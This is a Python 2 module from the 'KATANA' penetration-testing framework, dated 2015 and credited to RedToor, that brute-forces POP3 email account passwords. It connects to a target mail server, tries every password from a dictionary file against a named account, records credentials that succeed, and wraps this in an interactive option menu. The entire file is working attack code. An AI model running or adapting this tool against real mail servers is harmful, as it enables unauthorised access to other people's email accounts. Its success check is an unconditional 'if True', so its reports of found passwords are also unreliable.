# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Brute Force POP#
# Script by : RedToor        #
# Date      : 22/05/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core.Setting import *   #
from core import Errors      #
from core import help        #
from core import ping        #
import sys                   #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import time                  #
import poplib                #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaulthost=LOCAL_IP
defaultport=POP_PORT
defaultaccount=EMAIL
defaultdicc=DITIONARY_PASSWORDS
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(target,port,username,dictionary):
	global defaulthost,defaultport,defaultdicc
	defaulthost=target
	defaultport=port
	defaultaccount=username
	defaultdicc=dictionary
	btpop3(1)

def btpop3(run):
	try:
		global defaulthost,defaultport,defaultdicc,defaultaccount
		if run!=1:
			actions=raw_input(d.prompt("bt/pop3"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("email","yes","Account ",defaultaccount)
			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
			print ""
			btpop3(0)
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			d.change("target",defaulthost)
			btpop3(0)
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			d.change("port",defaultport)
			btpop3(0)
		elif actions[0:9] == "set email":
			defaultaccount = actions[10:]
			d.change("email",defaultaccount)
			btpop3(0)
		elif actions[0:10] == "set dict_1":
			defaultdicc = actions[11:]
			d.change("dict_1",defaultdicc)
			btpop3(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				red=poplib.POP3(defaulthost, defaultport)
				if True:
					try:
						d.loading_file()
						try:
							with open(defaultdicc,'r') as passs:
								for ps in passs: 
									ps=ps.replace("\n","")
									try:
										red.user(defaultaccount)
										red.pass_(ps)
										if True:
											ping.save("BruteForcePOP3",defaultaccount,ps)
											d.Success(defaultaccount,ps)
											btpop3(0)
									except:
										print " "+Alr+" Checking ("+defaultaccount+"="+ps+")"
						except:
							Errors.Errors(event=sys.exc_info()[0], info=defaultdicc)
					except:
						Errors.Errors(event=sys.exc_info()[0], info=False)
			except:
				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info()[0], info=False)
	btpop3(0)